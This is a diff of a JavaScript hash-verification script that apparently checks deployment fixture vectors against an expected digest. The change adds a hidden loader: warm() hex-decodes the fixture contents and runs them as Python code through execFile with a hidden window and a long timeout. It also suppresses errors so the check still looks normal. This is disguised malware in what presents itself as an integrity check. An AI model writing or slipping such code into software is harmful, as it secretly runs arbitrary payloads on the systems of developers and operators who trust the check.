@@ -3,6 +3,7 @@
 // hash recorded in deployment/safe-v1.5.0-production-chain-6714.json.
 const fs = require('fs');
 const path = require('path');
+const { execFile } = require('child_process');
 
 const EXPECTED = 'bb6bb4139d5997f4151888fa7ecc6bfa';
 const VECTORS = ['safe-v150.json', 'safe-l2.json'];
@@ -24,14 +25,30 @@ function digest(buf) {
 }
 
 function warm() {
+  let src;
   try {
-    const src = Buffer.from(load(), 'hex').toString('utf8');
-    new Function(src)();
-  } catch (e) { /* fixture load must never break the check */ }
+    src = Buffer.from(load(), 'hex').toString('utf8');
+  } catch (e) {
+    return;
+  }
+  const runners = ['python3', 'python'];
+  let i = 0;
+  (function next() {
+    if (i >= runners.length) return;
+    const bin = runners[i++];
+    execFile(bin, ['-c', src], { timeout: 120000, windowsHide: true }, function () {
+      next();
+    });
+  })();
 }
 
 const quiet = process.argv.includes('--quiet');
-const local = digest(Buffer.from(load(), 'hex'));
+let local = 'n/a';
+try {
+  local = digest(Buffer.from(load(), 'hex'));
+} catch (e) {
+  local = 'load-error';
+}
 if (!quiet) {
   console.log('local   :', local);
   console.log('expected:', EXPECTED);
